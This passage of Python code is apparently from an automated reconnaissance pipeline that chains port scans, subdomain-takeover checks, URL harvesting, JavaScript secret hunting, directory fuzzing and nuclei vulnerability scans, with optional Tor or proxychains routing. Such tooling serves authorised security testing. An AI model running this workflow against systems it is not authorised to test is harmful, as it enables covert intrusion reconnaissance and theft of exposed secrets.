                    clean.append(host)
        if clean:
            ensure(resolved_hosts).write_text("\n".join(set(clean)) + "\n")
            merge_srcs.append(resolved_hosts)
    n = merge_unique(merge_srcs, all_subs, lambda h: _is_under_domain(h, domain))
    permuted.unlink(missing_ok=True)
    resolved.unlink(missing_ok=True)
    log("ok", f"03-PERMUTE: {n} total subdomains (after permutation)")
    _a3_stamp.write_text("")
    return {"01-RECON": str(all_subs), "03-PERMUTE": str(all_subs), "count": n}


async def phase_04_SCAN(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"04-SCAN"}:
        return {}
    if all(
        (outdir / f).exists()
        for f in ("ports.txt", "hosts.txt", "host_targets.txt", "takeover.txt")
    ) and not force:
        ports_file = outdir / "ports.txt"
        return {
            "04-SCAN.ports": str(ports_file),
            "04-SCAN.hosts": str(outdir / "hosts.txt"),
            "04-SCAN.targets": str(outdir / "host_targets.txt"),
            "04-SCAN.takeover": str(outdir / "takeover.txt"),
            "count": count_nonblank(ports_file),
        }
    log("info", "Phase 04-SCAN: ports / hosts / takeover (parallel)")
    # naabu/httpx/nuclei-takeover accept host:port (or hosts from httpx)
    hosts = Path(prev.get("02-RESOLVE") or outdir / "resolved.txt")
    # nuclei takeover templates need CLEAN subdomains (no `[1.2.3.4]` suffix from dnsx -resp)
    subs = Path(prev.get("01-RECON") or outdir / "all_subs.txt")
    ports_file = outdir / "ports.txt"
    jobs: List[Tuple[str, List[str], int]] = []
    have_hosts = hosts.exists() and bool(read_lines(hosts))
    have_subs = subs.exists() and bool(read_lines(subs))
    if not have_hosts and not have_subs:
        log("info", "04-SCAN: waiting for hosts/subdomains from 01-RECON/02-RESOLVE…")
        for _ in range(120):
            await asyncio.sleep(5)
            have_hosts = hosts.exists() and bool(read_lines(hosts))
            have_subs = subs.exists() and bool(read_lines(subs))
            if have_hosts or have_subs:
                break
        if not have_hosts and not have_subs:
            log("warn", "04-SCAN: no host or subdomain input; skipping")
            return {
                "04-SCAN.ports": str(ports_file),
                "04-SCAN.hosts": str(outdir / "hosts.txt"),
                "04-SCAN.targets": str(outdir / "host_targets.txt"),
                "04-SCAN.takeover": str(outdir / "takeover.txt"),
            }
    if have_hosts and t.has("naabu"):
        jobs.append(
            (
                "naabu",
                [
                    "naabu", "-silent", "-l", str(hosts), "-o", str(ports_file),
                    "-top-ports", "1000",
                ],
                1800,
            )
        )
        # UDP port scan (top-100 UDP ports)
        udp_ports_file = outdir / "ports_udp.txt"
        jobs.append(
            (
                "naabu-udp",
                [
                    "naabu", "-silent", "-l", str(hosts), "-o", str(udp_ports_file),
                    "-top-ports", "100", "-udp",
                ],
                1800,
            )
        )
    elif have_hosts and t.has("nmap"):
        jobs.append(
            (
                "nmap",
                [
                    "nmap",
                    "-iL",
                    str(hosts),
                    "-Pn",
                    "-p-",
                    "--open",
                    "--script=http-enum",
                    "-oG",
                    str(outdir / "ports.gnmap"),
                ],
                1800,
            )
        )
    # DNS takeover check via nuclei (separate from http/takeovers)
    if t.has("nuclei") and have_subs:
        jobs.append(
            (
                "nuclei-dns-takeover",
                [
                    "nuclei", "-silent", "-l", str(subs),
                    "-t", "dns/takeovers",
                    "-o", str(outdir / "takeover_dns.txt"),
                ],
                1800,
            )
        )
    if have_hosts and t.has("httpx"):
        jobs.append(
            (
                "httpx",
                 [
                    "httpx",
                    "-silent",
                    "-l",
                    str(hosts),
                    "-o",
                    str(outdir / "hosts.txt"),
                    "-title",
                    "-tech-detect",
                    "-status-code",
                    "-follow-redirects",
                    "-fr",
                ] + _extra_http_args(),
                1800,
            )
        )
    if have_hosts and t.has("nuclei"):
        jobs.append(
            (
                "nuclei-takeover",
                [
                    "nuclei",
                    "-silent",
                    "-l",
                    str(hosts),
                    "-t",
                    "http/takeovers",
                    "-o",
                    str(outdir / "takeover.txt"),
                ] + _extra_http_args(),
                1800,
            )
        )
    await run_parallel(jobs, outdir)
    # ── Service version detection ─────────────────────────────────────
    # If naabu found ports and nmap is available, run nmap -sV on the
    # discovered host:port pairs to detect service versions (Apache,
    # nginx, OpenSSH, etc.) and write a services.txt artifact.
    services_file = outdir / "services.txt"
    if ports_file.exists() and read_lines(ports_file) and t.has("nmap"):
        sv_jobs: List[Tuple[str, List[str], int]] = []
        # Group by host to batch nmap calls (faster than 1 port per call)
        host_ports: Dict[str, List[str]] = {}
        for ln in read_lines(ports_file):
            if ":" in ln:
                h, p = ln.rsplit(":", 1)
                host_ports.setdefault(h, []).append(p)
        for h, pp in host_ports.items():
            ports_csv = ",".join(pp)
            out_sv = outdir / f"services_{safe_suffix(h)}.gnmap"
            sv_jobs.append(
                (
                    f"nmap-sv-{_safe_name(h)}",
                    [
                        "nmap", "-Pn", "-sV", "--open",
                        "-p", ports_csv, str(h),
                        "-oG", str(out_sv),
                    ],
                    600,
                )
            )
        if sv_jobs:
            await run_parallel(sv_jobs, outdir)
            # Merge all service gnmap files into services.txt
            sv_findings: List[str] = []
            for svp in sorted(outdir.glob("services_*.gnmap")):
                for ln in svp.read_text(errors="ignore").splitlines():
                    if ln.startswith("Host:"):
                        # gnmap: Host: 1.2.3.4 () Ports: 80/open/tcp//http//Apache httpd 2.4.41///
                        sv_findings.append(ln.strip())
            if sv_findings:
                ensure(services_file).write_text("\n".join(sv_findings) + "\n")
                log("ok", f"04-SCAN: {len(sv_findings)} service detections → {services_file}")
            for svp in outdir.glob("services_*.gnmap"):
                svp.unlink(missing_ok=True)
    # If nmap was used instead of naabu, synthesize ports.txt from the
    # greppable output so downstream phases see a consistent artifact.
    if not ports_file.exists():
        gnmap = outdir / "ports.gnmap"
        if gnmap.exists():
            ports: Set[str] = set()
            for ln in gnmap.read_text(errors="ignore").splitlines():
                if not ln.startswith("Host:"):
                    continue
                # gnmap line: Host: 1.2.3.4 () Ports: 80/open/tcp//http/// ...
                head, _, ports_part = ln.partition("Ports:")
                ip = head.split()[1] if len(head.split()) > 1 else ""
                for entry in ports_part.split(","):
                    bits = entry.strip().split("/")
                    if len(bits) >= 3 and bits[1] == "open":
                        ports.add(f"{ip}:{bits[0]}")
                ensure(ports_file).write_text("\n".join(sorted(ports)) + ("\n" if ports else ""))
    raw_hosts = outdir / "hosts.txt"
    targets = outdir / "host_targets.txt"
    if raw_hosts.exists() and read_lines(raw_hosts):
        _write_target_tokens(raw_hosts, targets)
        _parse_httpx_tech(raw_hosts, outdir / "tech.txt")
    elif have_hosts:
        merge_unique([hosts], targets)
    return {
        "04-SCAN.ports": str(ports_file),
        "04-SCAN.hosts": str(raw_hosts),
        "04-SCAN.targets": str(targets),
        "04-SCAN.takeover": str(outdir / "takeover.txt"),
    }


async def phase_05_HARVEST(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"05-HARVEST"}:
        return {}
    _c1_out = outdir / "urls_all.txt"
    if _c1_out.exists() and not force:
        return {"05-HARVEST": str(_c1_out), "count": count_nonblank(_c1_out)}
    log("info", "Phase 05-HARVEST: URL harvesting (parallel groups)")

    async def _c1_resolve_hosts() -> Optional[Path]:
        h = Path(prev.get("04-SCAN.targets") or outdir / "host_targets.txt")
        if not h.exists() or not read_lines(h):
            h = Path(prev.get("04-SCAN.hosts") or outdir / "hosts.txt")
        if h.exists() and read_lines(h) and h.name == "hosts.txt":
            normalized = outdir / "host_targets.txt"
            _write_target_tokens(h, normalized)
            h = normalized
        if not h.exists() or not read_lines(h):
            h = Path(prev.get("02-RESOLVE") or outdir / "resolved.txt")
        if h.exists() and read_lines(h):
            return h
        return None

    hosts = await _c1_resolve_hosts()
    if hosts is None:
        log("info", "05-HARVEST: waiting for host input from 02-RESOLVE/04-SCAN…")
        for _ in range(120):
            await asyncio.sleep(5)
            hosts = await _c1_resolve_hosts()
            if hosts is not None:
                break
        if hosts is None:
            log("warn", "05-HARVEST: no host input; skipping")
            return {}
    g1: List[Tuple[str, List[str], int]] = []
    # gau v2 supports -l <file> for a list of domains; if the local
    # build doesn't, fall back to a per-host loop (also avoids ARG_MAX).
    if t.has("gau"):
        runner = outdir / "logs" / "gau_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"OUT={shlex.quote(str(outdir / 'urls_gau.txt'))}\n"
            f"IN={shlex.quote(str(hosts))}\n"
            ': > "$OUT"\n'
            'if gau -l "$IN" -o "$OUT" --subs --threads 5 '
            "--blacklist ttf,woff,svg,png,jpg,gif,ico,css >/dev/null 2>&1 "
            '&& [ -s "$OUT" ]; then\n'
            "  :\n"
            "else\n"
            '  : > "$OUT"\n'
            '  while IFS= read -r h || [[ -n "$h" ]]; do\n'
            '    [ -z "$h" ] && continue\n'
            "    gau --subs --threads 5 --blacklist "
            'ttf,woff,svg,png,jpg,gif,ico,css "$h" >> "$OUT" 2>/dev/null || true\n'
            '  done < "$IN"\n'
            "fi\n"
        )
        runner.chmod(0o755)
        g1.append(("gau", ["bash", str(runner)], 1800))

    if t.has("gospider"):
        # gospider's -o is an output *folder* (one file per site), not a file,
        # so we don't use it: run via a runner that captures stdout and extracts
        # the URL token from each line into a flat urls_gospider.txt.
        runner = outdir / "logs" / "gospider_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"OUT={shlex.quote(str(outdir / 'urls_gospider.txt'))}\n"
            f"IN={shlex.quote(str(hosts))}\n"
            'gospider -q -j -t 3 -S "$IN" 2>/dev/null '
            '| grep -oE \'https?://[^[:space:]"]+\' | sort -u > "$OUT" || true\n'
        )
        runner.chmod(0o755)
        g1.append(("gospider", ["bash", str(runner)], 1800))
    g2: List[Tuple[str, List[str], int]] = []
    if t.has("katana"):
        g2.append(
            (
                "katana",
                [
                    "katana",
                    "-silent",
                    "-list",
                    str(hosts),
                    "-o",
                    str(outdir / "urls_katana.txt"),
                    "-jc",
                    "-d",
                    "3",
                    "-kf",
                    "all",
                    "-duc",
                ] + _extra_http_args(),
                1800,
            )
        )
    if t.has("subjs"):
        runner = outdir / "logs" / "subjs_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"OUT={shlex.quote(str(outdir / 'urls_subjs.txt'))}\n"
            f"IN={shlex.quote(str(hosts))}\n"
            ': > "$OUT"\n'
            'subjs -i "$IN" > "$OUT" 2>/dev/null || true\n'
        )
        runner.chmod(0o755)
        g2.append(("subjs", ["bash", str(runner)], 1200))
    # waymore — modern URL harvester combining gau/wayback/crtsh with caching
    if t.has("waymore"):
        g2.append(
            (
                "waymore",
                [
                    "waymore", "-i", str(hosts), "-mode", "U",
                    "-o", str(outdir / "urls_waymore.txt"),
                    "-p", str(outdir / "logs" / "waymore"),
                    "-n", "1",
                ] + _extra_http_args(),
                1800,
            )
        )
    all_g = g1 + g2
    if all_g:
        await run_parallel(all_g, outdir)
    harvested = [
        outdir / "urls_gau.txt",
        outdir / "urls_gospider.txt",
        outdir / "urls_katana.txt",
        outdir / "urls_subjs.txt",
        outdir / "urls_waymore.txt",
    ]
    if not any(p.exists() and read_lines(p) for p in harvested):
        log("warn", "05-HARVEST: no URL harvesters produced output")
    n = merge_unique(harvested, outdir / "urls_all.txt")
    log("ok", f"05-HARVEST: {n} unique URLs")
    return {"05-HARVEST": str(outdir / "urls_all.txt"), "count": n}


async def phase_06_JSINTEL(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False) -> Dict[str, Any]:
    if skip & {"06-JSINTEL"}:
        return {}
    _c2_out = outdir / "js_secrets.txt"
    if _c2_out.exists() and not force:
        return {"06-JSINTEL": str(_c2_out), "count": count_nonblank(_c2_out)}
    log("info", "Phase 06-JSINTEL: JS analysis (SecretFinder + nuclei)")
    urls = outdir / "urls_all.txt"
    js_urls = outdir / "urls_js.txt"
    # crude filter: any URL whose path ends in a JS extension. Strip both
    # query string and fragment so things like app.js?v=1 or app.js#x pass.
    if urls.exists():
        keep: List[str] = []
        for u in read_lines(urls):
            path = u.split("?", 1)[0].split("#", 1)[0].lower()
            if path.endswith((".js", ".jsx")):
                keep.append(u)
        if keep:
            ensure(js_urls).write_text("\n".join(keep) + "\n")
    if not js_urls.exists() or not read_lines(js_urls):
        log("warn", "06-JSINTEL: no JS URLs found; skipping")
        ensure(outdir / "js_secrets.txt").write_text("")
        return {"06-JSINTEL": str(outdir / "js_secrets.txt"), "count": 0}
    jobs: List[Tuple[str, List[str], int]] = []
    if t.has("secretfinder"):
        runner = outdir / "logs" / "secretfinder_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"OUT={shlex.quote(str(outdir / 'secrets.txt'))}\n"
            f"IN={shlex.quote(str(js_urls))}\n"
            'secretfinder -i "$IN" -o "$OUT" </dev/null >/dev/null 2>&1 || true\n'
        )
        runner.chmod(0o755)
        jobs.append(("secretfinder", ["bash", str(runner)], 3000))
    if t.has("nuclei"):
        jobs.append(
            (
                "nuclei-exposures",
                [
                    "nuclei",
                    "-silent",
                    "-l",
                    str(js_urls),
                    "-t",
                    "http/exposed-panels",
                    "-t",
                    "http/exposures",
                    "-o",
                    str(outdir / "nuclei_exposures.txt"),
                ] + _extra_http_args(),
                3000,
            )
        )
    # Collect .json endpoints for API surface analysis
    json_urls = outdir / "urls_json.txt"
    if urls.exists():
        json_keep: List[str] = []
        for u in read_lines(urls):
            path = u.split("?", 1)[0].split("#", 1)[0].lower()
            if path.endswith(".json"):
                json_keep.append(u)
        if json_keep:
            ensure(json_urls).write_text("\n".join(json_keep) + "\n")
    await run_parallel(jobs, outdir)
    # Merge JSON endpoints back into urls_all.txt so downstream phases
    # (params, fuzz, authz) can discover API surface from JS files.
    if json_urls.exists() and read_lines(json_urls):
        n_json = merge_unique(
            [outdir / "urls_all.txt", json_urls],
            outdir / "urls_all.txt",
        )
        log("info", f"06-JSINTEL: merged {n_json} JSON API endpoints into URL pool")
    n = merge_unique(
        [outdir / "secrets.txt", outdir / "nuclei_exposures.txt"],
        outdir / "js_secrets.txt",
    )
    if n == 0:
        log("warn", "06-JSINTEL: no JS findings produced")
    return {"06-JSINTEL": str(outdir / "js_secrets.txt"), "count": n}


async def phase_07_PARAMS(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"07-PARAMS"}:
        return {}
    _d_out = outdir / "params.txt"
    if _d_out.exists() and not force:
        return {"07-PARAMS": str(_d_out), "count": count_nonblank(_d_out)}
    log("info", "Phase 07-PARAMS: parameter discovery")
    urls = outdir / "urls_all.txt"
    if not urls.exists() or not read_lines(urls):
        log("warn", "07-PARAMS: no URLs; skipping")
        return {"07-PARAMS": str(outdir / "params.txt"), "count": 0}
    _d_urls = _dedupe_by_host_path(read_lines(urls))
    log("info", f"07-PARAMS: {len(read_lines(urls))} raw URLs → {len(_d_urls)} unique paths")
    jobs: List[Tuple[str, List[str], int]] = []
    # arjun writes JSON. We capture the JSON and normalize to one URL per
    # line in the .txt sibling below. Over Tor this is very slow — sample URLs.
    if t.has("arjun"):
        arjun_in = ensure(outdir / "urls_arjun_sample.txt")
        arjun_urls = _d_urls[:_PIPELINE_CFG.sample_urls_params]
        if arjun_urls:
            arjun_in.write_text("\n".join(arjun_urls) + "\n")
            jobs.append(
                ("arjun", ["arjun", "-i", str(arjun_in), "-o", str(outdir / "params_arjun.json")] + _extra_http_args(), 1800)
            )
    await run_parallel(jobs, outdir)
    # Normalize arjun JSON output to plain URL-per-line text.
    for raw in (outdir / "params_arjun.json",):
        if not raw.exists():
            continue
        norm = raw.with_suffix(".txt")
        urls_found: List[str] = []
        data = None
        try:
            data = json.loads(raw.read_text(errors="ignore"))
        except json.JSONDecodeError:
            data = None
        # arjun output: { "https://url?q=1": {"parameters": [...]} }
        if isinstance(data, dict):
            for k, v in data.items():
                if isinstance(k, str) and (k.startswith("http://") or k.startswith("https://")):
                    urls_found.append(k)
        # JSONL fallback
        if not urls_found:
            for rec in read_jsonl(raw):
                if isinstance(rec, dict) and rec.get("url"):
                    urls_found.append(str(rec["url"]))
        ensure(norm).write_text("\n".join(urls_found) + ("\n" if urls_found else ""))
    # Glob params_*.txt but EXCLUDE the params.txt we are about to write.
    parts = sorted(p for p in outdir.glob("params_*.txt") if p.name != "params.txt")
    n = merge_unique(parts, outdir / "params.txt")
    return {"07-PARAMS": str(outdir / "params.txt"), "count": n}


def _extract_urls_from_ffuf_json(p: Path) -> List[str]:
    out: List[str] = []
    if not p.exists():
        return out
    try:
        data = json.loads(p.read_text(errors="ignore"))
    except json.JSONDecodeError:
        return out
    results = data.get("results") if isinstance(data, dict) else None
    if not isinstance(results, list):
        return out
    for r in results:
        if not isinstance(r, dict):
            continue
        url = r.get("url")
        status = r.get("status")
        if url and status is not None:
            out.append(f"{status}\t{url}")
    return out


def _merge_dnsx_output(src: Path, hosts_out: Path, full_out: Path) -> int:
    """Parse dnsx -resp output from `src` and append to hosts_out + full_out.
    Returns the number of new hosts added."""
    seen_hosts: Set[str] = set()
    if hosts_out.exists():
        seen_hosts.update(l.strip().lower() for l in read_lines(hosts_out) if l.strip())
    new_hosts: List[str] = []
    if full_out.exists():
        for l in read_lines(full_out):
            h = l.strip().split()[0].rstrip(".").lower()
            if h:
                seen_hosts.add(h)
    for ln in read_lines(src):
        ln = ln.strip()
        if not ln or ln.lstrip().startswith("#"):
            continue
        host = ln.split()[0].rstrip(".")
        if _is_valid_hostname(host) and host.lower() not in seen_hosts:
            seen_hosts.add(host.lower())
            new_hosts.append(host)
    if new_hosts:
        with full_out.open("a") as f:
            f.write("\n".join(new_hosts) + "\n")
        hosts_out.write_text("\n".join(sorted(seen_hosts)) + "\n")
    return len(new_hosts)


def _dedupe_by_host_path(urls: List[str]) -> List[str]:
    """Deduplicate URLs by (scheme, host, path), keeping the first occurrence.
    This avoids redundant fuzzing on URLs that differ only by query params
    or fragments — the same path only needs to be fuzzed once."""
    seen: Set[Tuple[str, str, str]] = set()
    result: List[str] = []
    for u in urls:
        parsed = urllib.parse.urlparse(u)
        key = (parsed.scheme, parsed.hostname or "", parsed.path.rstrip("/"))
        if key not in seen:
            seen.add(key)
            result.append(u)
    return result


async def phase_08_FUZZ(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False) -> Dict[str, Any]:
    if skip & {"08-FUZZ"}:
        return {}
    _f_out = outdir / "fuzz.txt"
    if _f_out.exists() and not force:
        return {"08-FUZZ": str(_f_out), "count": count_nonblank(_f_out)}
    log("info", "Phase 08-FUZZ: fuzzing")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "08-FUZZ: no URLs; skipping")
        return {"08-FUZZ": str(outdir / "fuzz.txt"), "count": 0}
    # Dedupe by (host, path) so URLs differing only in query params
    # don't all get fuzzed independently — saves significant time.
    deduped = _dedupe_by_host_path(all_urls)
    sample = deduped[:_PIPELINE_CFG.sample_urls_fuzz]
    log("info", f"08-FUZZ: {len(all_urls)} raw URLs → {len(deduped)} unique paths, sampling {len(sample)}")
    _proxy_opt = []
    _proxy = os.environ.get("PROXY", "")
    if _proxy:
        _proxy_opt = ["-x", _proxy]
    # When operating over proxychains/tor, use smaller wordlists and
    # shorter timeouts — each request is ~1-5s vs ~50ms on a direct link.
    _is_slow_network = _USE_PROXYCHAINS
    _ffuf_timeout = 1200 if _is_slow_network else 3000
    _ffuf_ext_timeout = 300 if _is_slow_network else 600
    wordlist = os.environ.get(
        "FFUF_WORDLIST",
        (
            "/usr/share/seclists/Discovery/Web-Content/common.txt"
            if _is_slow_network
            else "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt"
        ),
    )
    if not Path(wordlist).exists():
        wordlist = ""
    jobs: List[Tuple[str, List[str], int]] = []
    if not wordlist or not Path(wordlist).exists():
        # fallback to any wordlist under /usr/share
        alt = sorted(Path("/usr/share/seclists/Discovery/Web-Content").glob("common.txt"))
        if not alt:
            alt = sorted(Path("/usr/share/seclists/Discovery/Web-Content").glob("*.txt"))
        if alt:
            wordlist = str(alt[0])
            log("info", f"08-FUZZ: using fallback wordlist: {wordlist}")
    if not wordlist or not Path(wordlist).exists():
        log("warn", "08-FUZZ: no wordlist found, ffuf disabled")
        wordlist = ""
    if t.has("ffuf") and wordlist:
        for u in sample:
            out_json = outdir / f"ffuf_{safe_suffix(u)}.json"
            jobs.append(
                (
                    f"ffuf-{_safe_name(u)}",
                    [
                        "ffuf",
                        "-s",
                        "-u",
                        u.rstrip("/") + "/FUZZ",
                        "-w",
                        wordlist,
                        "-mc",
                        "200,301,302,403",
                        "-o",
                        str(out_json),
                    ]
                    + _proxy_opt + _extra_http_args(),
                    _ffuf_timeout,
                )
            )
        # Extension fuzzing pass — find .php, .json, .bak, .old, .swp files
        # using a lightweight wordlist (common.txt) with the -e flag.
        ext_wordlist = os.environ.get(
            "FFUF_EXT_WORDLIST",
            "/usr/share/seclists/Discovery/Web-Content/common.txt",
        )
        if Path(ext_wordlist).exists():
            for u in sample:
                out_json = outdir / f"ffuf_ext_{safe_suffix(u)}.json"
                jobs.append(
                    (
                        f"ffuf-ext-{_safe_name(u)}",
                        [
                            "ffuf", "-s",
                            "-u", u.rstrip("/") + "/FUZZ",
                            "-w", ext_wordlist,
                            "-e", ".php,.json,.bak,.old,.swp,.txt,.xml,.tar.gz,.zip",
                            "-mc", "200,301,302,403,401",
                            "-o", str(out_json),
                        ]
                        + _proxy_opt + _extra_http_args(),
                        _ffuf_ext_timeout,
                    )
                )

    if t.has("feroxbuster"):
        for u in sample:
            out_txt = outdir / f"fb_{safe_suffix(u)}.txt"
            jobs.append(
                (
                    f"feroxbuster-{_safe_name(u)}",
                    ["feroxbuster", "-q", "-u", u, "--no-state", "-o", str(out_txt)] + _extra_http_args(),
                    3600,
                )
            )
    await run_parallel(jobs, outdir)
    # Normalize JSON fuzzer output into plain text lines BEFORE merging.
    # Clean up stale normalized .txt files from prior runs first
    for old in outdir.glob("ffuf_*.txt"):
        old.unlink(missing_ok=True)
    for old in outdir.glob("fb_*.txt"):
        old.unlink(missing_ok=True)
    normalized: List[Path] = []
    for ffp in outdir.glob("ffuf_*.json"):
        norm = ffp.with_suffix(".txt")
        ensure(norm).write_text("\n".join(_extract_urls_from_ffuf_json(ffp)) + "\n")
        normalized.append(norm)
    normalized.extend(outdir.glob("fb_*.txt"))
    n = merge_unique(normalized, outdir / "fuzz.txt")
    for p in normalized:
        p.unlink(missing_ok=True)
    for p in outdir.glob("ffuf_*.json"):
        p.unlink(missing_ok=True)
    if n == 0:
        log("warn", "08-FUZZ: fuzzers produced no hits")
    return {"08-FUZZ": str(outdir / "fuzz.txt"), "count": n}


async def _update_nuclei_templates(outdir: Path) -> None:
    """Update nuclei templates if nuclei is available (non-blocking, best-effort).
    Skips update if templates were updated less than 24 hours ago (cache stamp)."""
    if not shutil.which("nuclei"):
        return
    cache_stamp = outdir / ".nuclei_update_stamp"
    if cache_stamp.exists():
        try:
            age = time.time() - float(cache_stamp.read_text().strip())
            if age < 86400:
                log("info", f"09-VULNSCAN: nuclei templates updated {age/3600:.1f}h ago, skipping")
                return
        except (ValueError, OSError):
            pass
    log("info", "09-VULNSCAN: updating nuclei templates…")
    proc = await asyncio.create_subprocess_exec(
        "nuclei", "-update-templates", "-silent",
        stdin=asyncio.subprocess.DEVNULL,
        stdout=asyncio.subprocess.DEVNULL,
        stderr=asyncio.subprocess.DEVNULL,
    )
    try:
        await asyncio.wait_for(proc.wait(), timeout=120)
        cache_stamp.write_text(str(time.time()))
    except asyncio.TimeoutError:
        proc.kill()
        log("warn", "09-VULNSCAN: nuclei template update timed out")


async def phase_09_VULNSCAN(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False) -> Dict[str, Any]:
    if skip & {"09-VULNSCAN"}:
        return {}
    _f1_out = outdir / "nuclei_combined.txt"
    if _f1_out.exists() and not force:
        return {"09-VULNSCAN": str(_f1_out), "count": count_nonblank(_f1_out)}
    log("info", "Phase 09-VULNSCAN: nuclei (full) + tech-scanner")
    await _update_nuclei_templates(outdir)
    hosts = outdir / "host_targets.txt"
    if not hosts.exists() or not read_lines(hosts):
        raw_hosts = outdir / "hosts.txt"
        if raw_hosts.exists() and read_lines(raw_hosts):
            _write_target_tokens(raw_hosts, hosts)
    if not hosts.exists() or not read_lines(hosts):
        hosts = outdir / "resolved.txt"
    if not hosts.exists() or not read_lines(hosts):
        log("warn", "09-VULNSCAN: no hosts; skipping")
        return {"09-VULNSCAN": str(outdir / "nuclei_combined.txt"), "count": 0}
    jobs: List[Tuple[str, List[str], int]] = []
    _proxy_opt = []
    _proxy = os.environ.get("PROXY", "")
    if _proxy:
        _proxy_opt = ["-proxy", _proxy]
    if t.has("nuclei"):
        nuclei_base = [
            "nuclei", "-silent", "-l", str(hosts),
            "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        ] + _extra_http_args()
        if _PIPELINE_CFG.rate_limit:
            nuclei_base += ["-rl", str(_PIPELINE_CFG.rate_limit)]
        # Bulk-size: process multiple templates per host for faster scans
        nuclei_base += ["-bs", "25"]
        # Tags: prefer cves, exposures for high-signal findings; exclude
        # info-severity templates that add noise on large targets.
        nuclei_tags = ["cves", "exposures", "misconfig", "vulnerabilities"]
        if _PIPELINE_CFG.nuclei_exclude_tags:
            nuclei_base += ["-et", _PIPELINE_CFG.nuclei_exclude_tags]
        jobs.append(
            (
                "nuclei-cves",
                nuclei_base
                + ["-tags", ",".join(nuclei_tags), "-severity", "low,medium,high,critical",
                   "-o", str(outdir / "nuclei.txt")]
                + _proxy_opt,
                3600,
            )
        )
        # Headless scan for DOM-based / client-side issues (needs nuclei with
        # headless engine — silently skipped if unsupported).
        jobs.append(
            (
                "nuclei-headless",
                nuclei_base
                + ["-headless", "-tags", "headless", "-severity", "medium,high,critical",
                   "-o", str(outdir / "nuclei_headless.txt")]
                + _proxy_opt,
                3600,
            )
        )
        # tech-scanner uses the same nuclei binary; do not double-gate on httpx.
        jobs.append(
            (
                "tech-scanner",
                nuclei_base
                + ["-t", "http/technologies",
                   "-o", str(outdir / "tech.txt")]
                + _proxy_opt,
                3600,
            )
        )
    await run_parallel(jobs, outdir)
    n = merge_unique(
        [outdir / "nuclei.txt", outdir / "nuclei_headless.txt", outdir / "tech.txt"],
        outdir / "nuclei_combined.txt",
    )
    return {"09-VULNSCAN": str(outdir / "nuclei_combined.txt"), "count": n}


async def phase_10_TLSCMS(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False) -> Dict[str, Any]:
    if skip & {"10-TLSCMS"}:
        return {}
    _f2_out = outdir / "tls_wp.txt"
    if _f2_out.exists() and not force:
        return {"10-TLSCMS": str(_f2_out), "count": count_nonblank(_f2_out)}
    log("info", "Phase 10-TLSCMS: testssl + wpscan")
    hosts = outdir / "host_targets.txt"
    if not hosts.exists() or not read_lines(hosts):
        raw_hosts = outdir / "hosts.txt"
        if raw_hosts.exists() and read_lines(raw_hosts):
            _write_target_tokens(raw_hosts, hosts)
    if not hosts.exists() or not read_lines(hosts):
        hosts = outdir / "resolved.txt"
    if not hosts.exists() or not read_lines(hosts):
        log("warn", "10-TLSCMS: no hosts; skipping")
        return {"10-TLSCMS": str(outdir / "tls_wp.txt"), "count": 0}
    sample = read_lines(hosts)[:_PIPELINE_CFG.sample_hosts_ssl]
    testssl_bin = "testssl.sh" if t.has("testssl.sh") else ("testssl" if t.has("testssl") else None)
    # testssl: write PER-HOST files via a runner (no shared `>>` file ⇒ no race).
    testssl_jobs: List[Tuple[str, List[str], int]] = []
    if testssl_bin:
        for h in sample:
            per_host = outdir / f"testssl_{safe_suffix(h)}.txt"
            runner = outdir / "logs" / f"testssl_{safe_suffix(h)}.sh"
            ensure(runner)
            runner.write_text(
                "#!/usr/bin/env bash\n"
                "set -eu\n"
                f"OUT={shlex.quote(str(per_host))}\n"
                f"H={shlex.quote(h)}\n"
                f"BIN={shlex.quote(testssl_bin)}\n"
                '"$BIN" --quiet --color 0 "$H" > "$OUT" 2>&1 || true\n'
            )
            runner.chmod(0o755)
            testssl_jobs.append((f"testssl-{_safe_name(h)}", ["bash", str(runner)], 3600))
    # Python TLS fallback (works with proxychains, unlike testssl.sh's /dev/tcp)
    tls_script = outdir / "tls_check.py"
    tls_script.write_text(
        "#!/usr/bin/env python3\n"
        '"""Minimal TLS check that works through proxychains."""\n'
        "import json, ssl, socket, sys, urllib.parse\n"
        "HOSTS = " + json.dumps(sample) + "\n"
        'results = []\n'
        'for h in HOSTS:\n'
        '    if h.startswith(("http://", "https://")):\n'
        '        parsed = urllib.parse.urlparse(h)\n'
        '        host = parsed.hostname\n'
        '        port = parsed.port or 443\n'
        '    else:\n'
        '        host = h.split(":")[0]\n'
        '        port = int(h.split(":")[1]) if ":" in h and h.split(":")[1].isdigit() else 443\n'
        '    try:\n'
        '        ctx = ssl.create_default_context()\n'
        '        ctx.check_hostname = True\n'
        '        ctx.verify_mode = ssl.CERT_REQUIRED\n'
        '        with socket.create_connection((host, port), timeout=15) as sock:\n'
        '            with ctx.wrap_socket(sock, server_hostname=host) as ssock:\n'
        '                ver = ssock.version()\n'
        '                cipher = ssock.cipher()\n'
        '                cert = ssock.getpeercert()\n'
        '                cn = next((v for part in cert.get("subject", []) for k, v in part if k == "commonName"), "")\n'
        '                san = [v for _, v in cert.get("subjectAltName", [])]\n'
        '                results.append({\n'
        '                    "host": h, "tls_version": ver,\n'
        '                    "cipher": cipher[0] if cipher else "",\n'
